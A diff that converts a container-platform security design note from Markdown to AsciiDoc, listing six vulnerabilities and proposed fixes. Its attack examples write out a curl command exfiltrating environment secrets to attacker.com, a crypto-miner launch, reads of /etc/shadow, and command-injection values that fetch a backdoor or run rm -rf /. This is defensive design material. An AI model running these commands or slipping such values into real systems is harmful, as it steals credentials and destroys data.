@@ -1,27 +1,32 @@
-<!-- SPDX-License-Identifier: CC-BY-SA-4.0 -->
-# Obvious Vulnerabilities: Fix These First
+// SPDX-License-Identifier: CC-BY-SA-4.0
+= Obvious Vulnerabilities: Fix These First
 
-**Question**: "Can you see anything obvious though now?"
+*Question*: "Can you see anything obvious though now?"
 
-**Answer**: Yes, 3 critical and obvious vulnerabilities that must be fixed before building the UI.
+*Answer*: Yes, 3 critical and obvious vulnerabilities that must be fixed before building the UI.
 
----
+'''''
 
-## 🔴 CRITICAL #1: Secrets in Environment Variables
+[[red_circle-critical-1-secrets-in-environment-variables]]
+== 🔴 CRITICAL ++#++1: Secrets in Environment Variables
 
-### The Problem
+=== The Problem
 
-**Current approach** (if following Docker/Kubernetes patterns):
-```yaml
+*Current approach* (if following Docker/Kubernetes patterns):
+
+[source,yaml]
+----
 services:
   api:
     environment:
       - DATABASE_PASSWORD=supersecret123
       - API_KEY=sk-1234567890
-```
+----
 
-**Why this is TERRIBLE**:
-```bash
+*Why this is TERRIBLE*:
+
+[source,bash]
+----
 # Anyone with container access can read secrets
 docker exec api-1 env
 # DATABASE_PASSWORD=supersecret123  ← Visible in plain text!
@@ -40,11 +45,12 @@ ps auxe | grep api
 
 # Secrets in core dumps
 # If container crashes, core dump may contain secrets
-```
+----
 
-### Attack Time: **30 seconds**
+=== Attack Time: *30 seconds*
 
-```bash
+[source,bash]
+----
 # Step 1: List containers (5s)
 docker ps
 
@@ -59,44 +65,49 @@ env | grep -i token
 
 # Step 4: Exfiltrate (1s)
 curl -X POST http://attacker.com/exfil -d "$(env)"
-```
+----
 
-**Result**: 🔴 **ALL SECRETS STOLEN**
+*Result*: 🔴 *ALL SECRETS STOLEN*
 
-### The Fix: Fjord (Secrets Manager)
+=== The Fix: Fjord (Secrets Manager)
 
-**DO NOT put secrets in**:
-- Environment variables ❌
-- Config files ❌
-- Docker/Kubernetes secrets (better, but still visible) ⚠️
-- Git repositories ❌❌❌
+*DO NOT put secrets in*:
 
-**DO use**:
-- **Fjord** (encrypted secrets manager) ✅
-- Secrets injected at runtime only ✅
-- Never stored in container image ✅
-- Auto-rotation ✅
-- Audit trail ✅
+* Environment variables ❌
+* Config files ❌
+* Docker/Kubernetes secrets (better, but still visible) ⚠️
+* Git repositories ❌❌❌
 
-### Implementation Priority: **IMMEDIATE**
+*DO use*:
 
-This is the **#1 most obvious vulnerability**. Build Fjord first, before any UI work.
+* *Fjord* (encrypted secrets manager) ✅
+* Secrets injected at runtime only ✅
+* Never stored in container image ✅
+* Auto-rotation ✅
+* Audit trail ✅
 
----
+=== Implementation Priority: *IMMEDIATE*
 
-## 🔴 CRITICAL #2: No Runtime Monitoring
+This is the *++#++1 most obvious vulnerability*. Build Fjord first, before any UI work.
 
-### The Problem
+'''''
 
-**Current state**: Once containers are running, you have no visibility into:
-- What processes are running inside containers
-- What files are being accessed
-- What network connections are being made
-- Whether container breakout is being attempted
+[[red_circle-critical-2-no-runtime-monitoring]]
+== 🔴 CRITICAL ++#++2: No Runtime Monitoring
 
-### Example Attack
+=== The Problem
 
-```bash
+*Current state*: Once containers are running, you have no visibility into:
+
+* What processes are running inside containers
+* What files are being accessed
+* What network connections are being made
+* Whether container breakout is being attempted
+
+=== Example Attack
+
+[source,bash]
+----
 # Attacker compromises nginx container
 # Installs crypto miner (silent, runs in background)
 
@@ -107,10 +118,12 @@ nohup ./xmrig -o pool.evil.com &
 
 # Crypto miner runs forever
 # You never notice until AWS bill arrives ($10,000!)
-```
+----
 
-**Another example**:
-```bash
+*Another example*:
+
+[source,bash]
+----
 # Container breakout attempt
 docker exec nginx-1 sh
 
@@ -119,21 +132,23 @@ mount -t proc proc /proc
 cat /proc/1/root/etc/shadow  # Read host's password file
 
 # If successful, attacker has root on HOST, not just container
-```
+----
 
-### Attack Time: **2 minutes** (after initial compromise)
+=== Attack Time: *2 minutes* (after initial compromise)
 
-### The Fix: Cape (Runtime Security Monitor)
+=== The Fix: Cape (Runtime Security Monitor)
 
-**What Cape would detect**:
-- ✅ Unexpected processes (crypto miner detected immediately)
-- ✅ Container breakout attempts (mount syscalls flagged)
-- ✅ Unexpected network connections (outbound to evil.com blocked)
-- ✅ File integrity violations (xmrig binary detected)
-- ✅ Privilege escalation attempts
+*What Cape would detect*:
 
-**How it works**:
-```
+* ✅ Unexpected processes (crypto miner detected immediately)
+* ✅ Container breakout attempts (mount syscalls flagged)
+* ✅ Unexpected network connections (outbound to evil.com blocked)
+* ✅ File integrity violations (xmrig binary detected)
+* ✅ Privilege escalation attempts
+
+*How it works*:
+
+....
 eBPF monitors all syscalls
     ↓
 Anomaly detected (unexpected mount)
@@ -143,21 +158,22 @@ Alert sent to stapeln UI
 User sees: "🔴 Container nginx-1 attempting breakout!"
     ↓
 [Kill Container] [Quarantine] [Investigate]
-```
+....
 
-### Implementation Priority: **CRITICAL**
+=== Implementation Priority: *CRITICAL*
 
-This is the **#2 most obvious vulnerability**. Without runtime monitoring, you're blind to attacks in progress.
+This is the *++#++2 most obvious vulnerability*. Without runtime monitoring, you're blind to attacks in progress.
 
----
+'''''
 
-## 🔴 CRITICAL #3: No Network Segmentation
+[[red_circle-critical-3-no-network-segmentation]]
+== 🔴 CRITICAL ++#++3: No Network Segmentation
 
-### The Problem
+=== The Problem
 
-**Current state**: All containers on same network can talk to each other freely.
+*Current state*: All containers on same network can talk to each other freely.
 
-```
+....
 ┌─────────┐     ┌──────────┐     ┌──────────┐
 │  nginx  │────→│   API    │────→│ Postgres │
 │ (public)│     │ (private)│     │ (private)│
@@ -165,10 +181,12 @@ This is the **#2 most obvious vulnerability**. Without runtime monitoring, you'r
      │                                  ▲
      └──────────────────────────────────┘
             ❌ NGINX CAN BYPASS API!
-```
+....
 
-**Attack scenario**:
-```bash
+*Attack scenario*:
+
+[source,bash]
+----
 # Attacker compromises nginx (public-facing)
 docker exec nginx-1 sh
 
@@ -180,14 +198,15 @@ psql -h 172.17.0.3 -U postgres
 
 # BYPASS API ENTIRELY!
 # No authentication, no rate limiting, no audit log
-```
+----
 
-### Attack Time: **1 minute** (after initial compromise)
+=== Attack Time: *1 minute* (after initial compromise)
 
-### The Fix: Strait (Network Policy Engine)
+=== The Fix: Strait (Network Policy Engine)
 
-**Proper segmentation**:
-```
+*Proper segmentation*:
+
+....
 ┌─────────┐     ┌──────────┐     ┌──────────┐
 │  nginx  │────→│   API    │────→│ Postgres │
 │ (public)│  ✅ │ (private)│  ✅ │ (private)│
@@ -195,41 +214,48 @@ psql -h 172.17.0.3 -U postgres
      │                                  ▲
      └───────────────────────────────────┘
               ❌ BLOCKED BY POLICY
-```
+....
 
-**Network policy**:
-```yaml
+*Network policy*:
+
+[source,yaml]
+----
 # Only API can talk to database
 nginx → postgres: ❌ DENY
 nginx → API: ✅ ALLOW
 API → postgres: ✅ ALLOW
-```
+----
 
-**With mTLS**:
-```
+*With mTLS*:
+
+....
 All connections encrypted with mutual TLS
 Each service has cryptographic identity
 Can't impersonate another service
-```
+....
 
-### Implementation Priority: **CRITICAL**
+=== Implementation Priority: *CRITICAL*
 
-This is the **#3 most obvious vulnerability**. One compromised container = entire network compromised.
+This is the *++#++3 most obvious vulnerability*. One compromised container = entire network compromised.
 
----
+'''''
 
-## ⚠️  HIGH: Ephemeral Pinholes Too Long
+[[warning-high-ephemeral-pinholes-too-long]]
+== ⚠️ HIGH: Ephemeral Pinholes Too Long
 
-### The Problem
+=== The Problem
 
-**Current design**: Ephemeral pinholes can stay open up to 24 hours
+*Current design*: Ephemeral pinholes can stay open up to 24 hours
 
-```elixir
+[source,elixir]
+----
 @max_duration 86400  # 24 hours
-```
+----
 
-**Why this is risky**:
-```bash
+*Why this is risky*:
+
+[source,bash]
+----
 # User opens port 8080 for "quick test"
 # Forgets about it
 # Goes home for the day
@@ -239,21 +265,24 @@ nmap public-ip
 # Port 8080 open!
 
 # Exploits service on port 8080
-```
+----
 
-### Attack Time: **Anywhere from 1 minute to 24 hours** (race condition)
+=== Attack Time: *Anywhere from 1 minute to 24 hours* (race condition)
 
-### The Fix: Reduce Maximum Duration
+=== The Fix: Reduce Maximum Duration
 
-**Recommendation**:
-```elixir
+*Recommendation*:
+
+[source,elixir]
+----
 @max_duration 300    # 5 minutes (not 24 hours!)
 @min_duration 30     # 30 seconds
 @default_duration 60 # 1 minute default
-```
+----
 
-**Better UX**:
-```
+*Better UX*:
+
+....
 User: "I need to test port 8080"
 stapeln: "Opening port 8080 for 1 minute"
          "⏱️  59 seconds remaining"
@@ -263,30 +292,35 @@ stapeln: "Opening port 8080 for 1 minute"
 User: "I need more time"
 stapeln: "Extend for another minute?"
          [Yes] [No]
-```
+....
 
-**Force user attention** - can't set and forget for 24 hours
+*Force user attention* - can't set and forget for 24 hours
 
-### Implementation Priority: **HIGH** (easy fix)
+=== Implementation Priority: *HIGH* (easy fix)
 
----
+'''''
 
-## ⚠️  HIGH: No Input Validation on Component Names
+[[warning-high-no-input-validation-on-component-names]]
+== ⚠️ HIGH: No Input Validation on Component Names
 
-### The Problem
+=== The Problem
 
-**Current code** (Model.res):
-```affinescript
+*Current code* (Model.res):
+
+[source,affinescript]
+----
 type component = {
   id: string,
   componentType: componentType,
   position: position,
   config: Js.Dict.t<string>,  // ← Any string! 🔴
 }
-```
+----
 
-**Attack vector**:
-```bash
+*Attack vector*:
+
+[source,bash]
+----
 # User creates component with malicious name
 Component name: nginx; curl http://evil.com/backdoor.sh | sh
 
@@ -295,20 +329,24 @@ Port: 8080; rm -rf /
 
 # Or in volume mount
 Volume: /data; cat /etc/shadow > /tmp/pwned
-```
+----
 
-**If these strings are passed to shell without sanitization**:
-```bash
+*If these strings are passed to shell without sanitization*:
+
+[source,bash]
+----
 docker run --name "nginx; curl evil.com/backdoor | sh" ...
 # Command injection! 🔴
-```
+----
 
-### Attack Time: **30 seconds**
+=== Attack Time: *30 seconds*
 
-### The Fix: Strict Validation
+=== The Fix: Strict Validation
 
-**Whitelist-only validation**:
-```affinescript
+*Whitelist-only validation*:
+
+[source,affinescript]
+----
 // Only allow alphanumeric + dash + underscore
 let isValidComponentName = (name: string): bool => {
   Js.Re.test_(%re("/^[a-zA-Z0-9_-]+$/"), name)
@@ -327,10 +365,12 @@ let isValidVolumePath = (path: string): bool => {
   String.startsWith(path, "/") &&
   !Js.Re.test_(%re("/[;&|`$()]/"), path)
 }
-```
+----
 
-**Backend validation** (Elixir):
-```elixir
+*Backend validation* (Elixir):
+
+[source,elixir]
+----
 defmodule Stapeln.Validation do
   @component_name_regex ~r/^[a-zA-Z0-9_-]+$/
 
@@ -342,18 +382,21 @@ defmodule Stapeln.Validation do
     end
   end
 end
-```
+----
 
-### Implementation Priority: **HIGH**
+=== Implementation Priority: *HIGH*
 
----
+'''''
 
-## ⚠️  HIGH: Default Settings Too Permissive
+[[warning-high-default-settings-too-permissive]]
+== ⚠️ HIGH: Default Settings Too Permissive
 
-### The Problem
+=== The Problem
 
-**Current defaults** (Settings.res):
-```affinescript
+*Current defaults* (Settings.res):
+
+[source,affinescript]
+----
 type settings = {
   defaultRuntime: Podman,  // ✅ Good
   autoVerifySignatures: bool,  // ⚠️  What's the default?
@@ -361,23 +404,26 @@ type settings = {
   defaultCpuLimit: float,  // ⚠️  Unlimited by default?
   // ...
 }
-```
+----
 
-**If defaults are**:
-```affinescript
+*If defaults are*:
+
+[source,affinescript]
+----
 {
   autoVerifySignatures: false,  // ❌ BAD
   requireSBOM: false,  // ❌ BAD
   defaultCpuLimit: 0.0,  // ❌ Unlimited!
   allowPrivileged: true,  // ❌❌❌ TERRIBLE
 }
-```
+----
 
-**Then every new component is insecure by default!**
+*Then every new component is insecure by default!*
 
-### The Fix: Secure Defaults
+=== The Fix: Secure Defaults
 
-```affinescript
+[source,affinescript]
+----
 // settings/defaults.res
 // SPDX-License-Identifier: CC-BY-SA-4.0
 
@@ -393,11 +439,11 @@ let secureDefaults: settings = {
   dropCapabilities: ["ALL"],  // ✅ Drop all caps
   noNewPrivileges: true,  // ✅ Can't escalate
 }
-```
+----
 
-**Rule**: **Secure by default, allow opt-out with confirmation**
+*Rule*: *Secure by default, allow opt-out with confirmation*
 
-```
+....
 User tries to enable privileged mode:
 
 ⚠️  WARNING: Dangerous Setting
@@ -411,65 +457,72 @@ This is RARELY needed and creates significant security risk.
 
 Are you absolutely sure?
 [No, Keep Safe] [Yes, Enable (I Know The Risks)]
-```
+....
 
-### Implementation Priority: **HIGH**
+=== Implementation Priority: *HIGH*
 
----
+'''''
 
-## Summary: Build These First (Before UI)
+== Summary: Build These First (Before UI)
 
-### Phase 0: Security Foundation (Do This First!)
+=== Phase 0: Security Foundation (Do This First!)
 
-**Week 1-2: Fjord (Secrets Manager)** 🔴 CRITICAL
-- Encrypted secrets storage
-- Runtime injection only
-- Auto-rotation
-- Audit trail
+*Week 1-2: Fjord (Secrets Manager)* 🔴 CRITICAL
 
-**Week 3-4: Cape (Runtime Monitor)** 🔴 CRITICAL
-- eBPF syscall monitoring
-- Container breakout detection
-- Crypto miner detection
-- Process anomaly detection
+* Encrypted secrets storage
+* Runtime injection only
+* Auto-rotation
+* Audit trail
 
-**Week 5-6: Strait (Network Policy)** 🔴 CRITICAL
-- Zero-trust segmentation
-- mTLS between services
-- Policy enforcement
-- Network isolation
+*Week 3-4: Cape (Runtime Monitor)* 🔴 CRITICAL
 
-**Week 7: Security Hardening** ⚠️  HIGH
-- Input validation (whitelist-only)
-- Secure defaults
-- Ephemeral pinhole limits (5 min max)
-- Fuzz testing
+* eBPF syscall monitoring
+* Container breakout detection
+* Crypto miner detection
+* Process anomaly detection
 
-### Then Phase 1: Configuration UI
+*Week 5-6: Strait (Network Policy)* 🔴 CRITICAL
 
-**Week 8+: stapeln UI**
-- Visual designer
-- Game-like interface
-- Attack surface analyzer
-- Built on top of secure foundation
+* Zero-trust segmentation
+* mTLS between services
+* Policy enforcement
+* Network isolation
 
----
+*Week 7: Security Hardening* ⚠️ HIGH
 
-## Why Security First?
+* Input validation (whitelist-only)
+* Secure defaults
+* Ephemeral pinhole limits (5 min max)
+* Fuzz testing
 
-### 1. **Can't Bolt Security On Later**
+=== Then Phase 1: Configuration UI
 
-```
+*Week 8{plus}: stapeln UI*
+
+* Visual designer
+* Game-like interface
+* Attack surface analyzer
+* Built on top of secure foundation
+
+'''''
+
+== Why Security First?
+
+[[1-cant-bolt-security-on-later]]
+=== 1. *Can't Bolt Security On Later*
+
+....
 ❌ Bad Approach:
 Build UI → Deploy → Users adopt → "Oh no, secrets leak!" → Try to fix
 
 ✅ Good Approach:
 Build security → Build UI on top → Deploy → Secure from day 1
-```
+....
 
-### 2. **Users Won't Notice (Until It's Too Late)**
+[[2-users-wont-notice-until-its-too-late]]
+=== 2. *Users Won't Notice (Until It's Too Late)*
 
-```
+....
 User: "This UI is beautiful!"
 Attacker: *steals all secrets via env vars*
 User: "Oh no! Our database was breached!"
@@ -481,11 +534,12 @@ Attacker: *tries to steal secrets*
 Fjord: "Access denied, logged, alerted"
 User: "Why didn't anything bad happen?"
 You: "Because we built security first 😎"
-```
+....
 
-### 3. **Your Son Will Test It**
+[[3-your-son-will-test-it]]
+=== 3. *Your Son Will Test It*
 
-```
+....
 Son: "Let me try this container thing you built..."
          *2 minutes later*
 Son: "I have all your database passwords"
@@ -497,57 +551,66 @@ Son: "Let me try this container thing you built..."
          *2 hours later*
 Son: "Okay fine, I can't break it. Not bad."
 You: "🎯"
-```
+....
 
----
+'''''
 
-## Recommended Build Order
+== Recommended Build Order
 
-### Priority 1: Core Security (6 weeks)
-1. Fjord (secrets manager)
-2. Cape (runtime monitor)
-3. Strait (network policy)
-4. Input validation
-5. Secure defaults
-6. Ephemeral pinhole limits
+=== Priority 1: Core Security (6 weeks)
 
-### Priority 2: Configuration UI (4 weeks)
-7. stapeln frontend (affinescript)
-8. Game-like interface
-9. Attack surface analyzer
-10. Simulation mode
+[arabic]
+. Fjord (secrets manager)
+. Cape (runtime monitor)
+. Strait (network policy)
+. Input validation
+. Secure defaults
+. Ephemeral pinhole limits
 
-### Priority 3: Advanced Security (2 weeks)
-11. Hnitbjorg (registry)
-12. Dáinsleif (HSM/key management)
+=== Priority 2: Configuration UI (4 weeks)
 
-### Priority 4: Polish (2 weeks)
-13. User testing
-14. Documentation
-15. "Break My Stack" challenge with your son
+[arabic, start=7]
+. stapeln frontend (affinescript)
+. Game-like interface
+. Attack surface analyzer
+. Simulation mode
 
-**Total**: 14 weeks to fully secure, polished system
+=== Priority 3: Advanced Security (2 weeks)
 
----
+[arabic, start=11]
+. Hnitbjorg (registry)
+. Dáinsleif (HSM/key management)
 
-## The Obvious Vulnerabilities (Summary)
+=== Priority 4: Polish (2 weeks)
 
-**What's obvious right now?**
+[arabic, start=13]
+. User testing
+. Documentation
+. "Break My Stack" challenge with your son
 
-1. 🔴 **Secrets in environment variables** - Instant pwn (30 seconds)
-2. 🔴 **No runtime monitoring** - Blind to attacks in progress (2 minutes)
-3. 🔴 **No network segmentation** - One breach = all breached (1 minute)
-4. ⚠️  **Ephemeral pinholes too long** - 24 hours is risky (reduce to 5 min)
-5. ⚠️  **No input validation** - Command injection risk (30 seconds)
-6. ⚠️  **Insecure defaults** - Every component vulnerable by default
+*Total*: 14 weeks to fully secure, polished system
 
-**Fix these BEFORE building the pretty UI.**
+'''''
 
-**Then your son can't destroy it in 2 seconds, 2 minutes, OR 2 hours.** 🔒
+== The Obvious Vulnerabilities (Summary)
 
----
+*What's obvious right now?*
 
-**Document Version**: 1.0
-**Last Updated**: 2026-02-05
-**Status**: Security foundation design - ready for implementation
-**Recommendation**: Build Fjord, Cape, Strait FIRST, then stapeln UI
+[arabic]
+. 🔴 *Secrets in environment variables* - Instant pwn (30 seconds)
+. 🔴 *No runtime monitoring* - Blind to attacks in progress (2 minutes)
+. 🔴 *No network segmentation* - One breach = all breached (1 minute)
+. ⚠️ *Ephemeral pinholes too long* - 24 hours is risky (reduce to 5 min)
+. ⚠️ *No input validation* - Command injection risk (30 seconds)
+. ⚠️ *Insecure defaults* - Every component vulnerable by default
+
+*Fix these BEFORE building the pretty UI.*
+
+*Then your son can't destroy it in 2 seconds, 2 minutes, OR 2 hours.* 🔒
+
+'''''
+
+*Document Version*: 1.0
+*Last Updated*: 2026-02-05
+*Status*: Security foundation design - ready for implementation
+*Recommendation*: Build Fjord, Cape, Strait FIRST, then stapeln UI
